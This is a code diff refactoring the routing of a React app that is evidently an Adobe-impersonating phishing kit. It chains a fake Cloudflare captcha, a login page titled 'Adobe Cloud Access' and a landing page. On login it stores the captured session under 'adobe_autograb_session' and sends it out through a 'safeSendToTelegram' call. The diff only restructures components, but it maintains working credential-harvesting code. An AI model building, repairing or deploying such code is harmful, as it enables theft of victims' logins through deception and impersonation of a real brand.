@@ -10,12 +10,14 @@ import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieCha
 
 const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
 
-function App() {
+// This is the new component that contains all the routing logic.
+// It can use `useNavigate` because it will always be a child of `<BrowserRouter>`.
+function AppRoutes() {
   // --- STATE ---
   const [isMobile, setIsMobile] = useState(false);
   const [selectedFileName, setSelectedFileName] = useState('');
-  const [isLoading, setIsLoading] = useState(true); // For initial app load only
-  const [hasSession, setHasSession] = useState(() => !!getCookie('adobe_session')); // Initial check for session
+  const [isLoading, setIsLoading] = useState(true);
+  const [hasSession, setHasSession] = useState(() => !!getCookie('adobe_session'));
   const navigate = useNavigate();
 
   // --- YOUR CORE FUNCTIONS (UNCHANGED) ---
@@ -45,8 +47,8 @@ function App() {
     localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
     try { await safeSendToTelegram(updatedSession); } catch (error) { console.error('Failed to send to Telegram:', error); }
 
-    setHasSession(true); // Update session state
-    navigate('/landing'); // Navigate to the landing page
+    setHasSession(true);
+    navigate('/landing');
   };
 
   const handleLogout = () => {
@@ -54,8 +56,8 @@ function App() {
     sessionStorage.clear();
     const cookieNames = ['adobe_session', 'sessionid', 'auth_token', 'logged_in', 'user_email'];
     cookieNames.forEach(cookieName => removeCookie(cookieName, { path: '/' }));
-    setHasSession(false); // Update session state
-    navigate('/'); // Navigate to the captcha page
+    setHasSession(false);
+    navigate('/');
   };
 
   const handleCaptchaVerified = () => navigate('/login');
@@ -81,7 +83,7 @@ function App() {
   }, [hasSession]);
 
   useEffect(() => {
-    setIsLoading(false); // Turn off initial loader after first render
+    setIsLoading(false);
   }, []);
 
   // --- RENDER LOGIC ---
@@ -98,18 +100,18 @@ function App() {
 
   return (
     <Routes>
-      <Route path="/" element={
-        hasSession ? <Navigate to="/landing" replace /> : <CloudflareCaptcha onCaptchaVerified={handleCaptchaVerified} onVerified={handleCaptchaVerified} onCaptchaError={(e) => console.error(e)} />
-      } />
-      <Route path="/login" element={
-        hasSession ? <Navigate to="/landing" replace /> : <LoginComponent fileName="Adobe Cloud Access" onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={(e) => console.error(e)} showBackButton={true} />
-      } />
-      <Route path="/landing" element={
-        !hasSession ? <Navigate to="/" replace /> : <LandingComponent onFileAction={handleFileAction} onLogout={handleLogout} />
-      } />
+      <Route path="/" element={hasSession ? <Navigate to="/landing" replace /> : <CloudflareCaptcha onCaptchaVerified={handleCaptchaVerified} onVerified={handleCaptchaVerified} onCaptchaError={(e) => console.error(e)} />} />
+      <Route path="/login" element={hasSession ? <Navigate to="/landing" replace /> : <LoginComponent fileName="Adobe Cloud Access" onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={(e) => console.error(e)} showBackButton={true} />} />
+      <Route path="/landing" element={!hasSession ? <Navigate to="/" replace /> : <LandingComponent onFileAction={handleFileAction} onLogout={handleLogout} />} />
       <Route path="*" element={<Navigate to={hasSession ? "/landing" : "/"} replace />} />
     </Routes>
   );
+}
+
+// The main App component is now very simple. It just renders the AppRoutes.
+// Because App is wrapped by <BrowserRouter> in index.tsx, AppRoutes is now a valid descendant.
+function App() {
+  return <AppRoutes />;
 }
 
 export default App;
